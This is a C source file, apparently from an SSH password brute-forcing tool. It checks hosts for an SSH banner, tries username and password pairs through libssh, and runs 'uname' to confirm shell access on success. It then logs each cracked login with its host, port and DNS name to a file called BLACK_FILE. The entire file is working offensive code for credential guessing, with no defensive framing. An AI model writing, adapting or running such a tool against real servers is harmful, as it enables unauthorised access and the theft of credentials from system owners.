/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "sshb.h"
#include <arpa/inet.h>
#include <errno.h>
#include <libssh/libssh.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

extern int timeout_secs; // from main.c

/*
 * Check if there is a true of ssh daemon.
 * Returns false (0) or true (1).
 */
int check_if_ssh(char *ip, unsigned int port) {
    int sock, errno_bkp, selret, recv_size;
    char buffer[1024] = "";
    struct sockaddr_in con_addr;
    struct timeval time_out;
    fd_set read_fd;
    memset(&con_addr, 0x00, sizeof(struct sockaddr_in));
    memset(&time_out, 0x00, sizeof(struct timeval));

    // creating socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 1) {
        errno_bkp = errno;
        log_printf(LOG_FILE, "check_if_ssh: Cannot create socket: %s\n",
                   strerror(errno_bkp));
        exit(errno_bkp);
    }

    // setting up connection structure
    con_addr.sin_family = AF_INET;
    con_addr.sin_port = htons(port);
    con_addr.sin_addr.s_addr = inet_addr(ip);

    // try to connect
    if (connect(sock, (struct sockaddr *)&con_addr, sizeof(struct sockaddr)) <
        0) {
        errno_bkp = errno;
        log_printf(LOG_FILE, "check_if_ssh: Cannot connect: %s\n",
                   strerror(errno_bkp));
        exit(errno_bkp);
    }

    // now we are connected, set time out value
    FD_ZERO(&read_fd);
    FD_SET(sock, &read_fd);
    time_out.tv_sec = timeout_secs;
    selret = select(sock + 1, &read_fd, 0, 0, &time_out);
    switch (selret) {
    case -1:
        errno_bkp = errno;
        log_printf(LOG_FILE, "check_if_ssh: select(): %s\n",
                   strerror(errno_bkp));
        exit(errno_bkp);
        break;

    case 0:
        log_printf(LOG_FILE, "check_if_ssh: connexion timed out\n");
        close(sock);
        return 0;
        break;

    default:
        if (FD_ISSET(sock, &read_fd)) {
            recv_size = recv(sock, buffer, sizeof(buffer), 0);
            if (recv_size < 1) {
                errno_bkp = errno;
                log_printf(LOG_FILE, "check_if_ssh: recv_size < 1: %s\n",
                           strerror(errno_bkp));
                close(sock);
                return 0;
            }

            if (!strstr(buffer, "SSH-")) {
                close(sock);
                log_printf(LOG_FILE, "check_if_ssh: %s \n", buffer);
                return 0;
            }
        }
    }
    if (sock) close(sock);
    return 1;
}

/*
 * Check if remote sshd can spawn shell session and exec `uname' command
 * Return:
 *       1 - if true.
 *       0 - false.
 */
int spawn_shell(ssh_session *session, char *result) {
    BUFFER *readbuf = buffer_new();
    CHANNEL *channels[2], *channel;
    int len, ret;

    channel = channel_new(session);
    if (channel_open_session(channel)) {
        strcpy(result, ssh_get_error(session));
        ret = 0;
        goto cleanup;
    }

    if (channel_request_exec(channel, "uname\n")) {
        strcpy(result, ssh_get_error(session));
        ret = 0;
        goto cleanup;
    }

    // if (channel_request_shell(channel)) {
    //     strcpy(result, ssh_get_error(session));
    //     ret = 0;
    //     goto cleanup;
    // }

    channels[0] = channel;
    channels[1] = NULL;
    channel_select(channels, NULL, NULL, NULL);

    if (channel && channel_is_closed(channel)) {
        ret = 0;
        goto cleanup;
    }

    if (channel && channel_is_open(channel) && channel_poll(channel, 0)) {

        len = channel_read(channel, readbuf, 0, 0);
        if (len == -1) return 0;

        if (len == 0) {
            ret = 0;
            goto cleanup;
        } else {
            strcpy(result, buffer_get(readbuf));
            result[len - 1] = 0x00;
            buffer_free(readbuf);
            channel_send_eof(channel);
            ret = 1;
        }
    }

cleanup:
    channel_free(channel);
    channel = NULL;
    channels[0] = NULL;
    return ret;
}

/*
 * Try login, return:
 *    0 if cannot connect.
 *    1 if connected, but incorrect passwd.
 *    2 logged in successfull.
 */
int check_ssh_auth(char *user, char *passwd, char *host, unsigned int port) {
    SSH_SESSION *session;
    SSH_OPTIONS *options;

    int retval = 0;
    char dnsname[64] = "";
    char uname_result[256] = "";
    unsigned int addr = 0;
    struct hostent *hp;

    options = ssh_options_new();
    ssh_options_set_username(options, user);
    ssh_options_set_host(options, host);
    ssh_options_set_port(options, port);
    ssh_options_set_timeout(options, timeout_secs, 0);
    session = ssh_new();
    ssh_set_options(session, options);

    if (ssh_connect(session)) {
        retval = 0;
        goto cleanup;
    }

    // try password
    if (ssh_userauth_password(session, NULL, passwd) == SSH_AUTH_SUCCESS) {

        // resolve dns name
        memset(dnsname, 0x00, sizeof(dnsname));
        addr = inet_addr(host);
        hp = gethostbyaddr((char *)&addr, 4, AF_INET);
        if (hp)
            memcpy(dnsname, hp->h_name, sizeof(dnsname));
        else
            strcpy(dnsname, "!");

        // check if server spawn a shell
        if (spawn_shell(session, uname_result)) // write data to log file
            log_printf(BLACK_FILE, "%s:%s:%s:%s:%d:%s:$\n", uname_result, user,
                       passwd, host, port, dnsname);
        else
            log_printf(CRAP_FILE, "%s:%s:%s:%d:[%s]$\n", user, passwd, host,
                       port, uname_result);

        retval = 2;
        goto cleanup;
    } else {
        debugf(":%s:%d:%s:%s\n", host, port, user, passwd);
        retval = 1;
        goto cleanup;
    }

// end ssh session
cleanup:
    ssh_disconnect(session);
    ssh_finalize();
    // ssh_options_free(options); ->wtf?
    return retval;
}
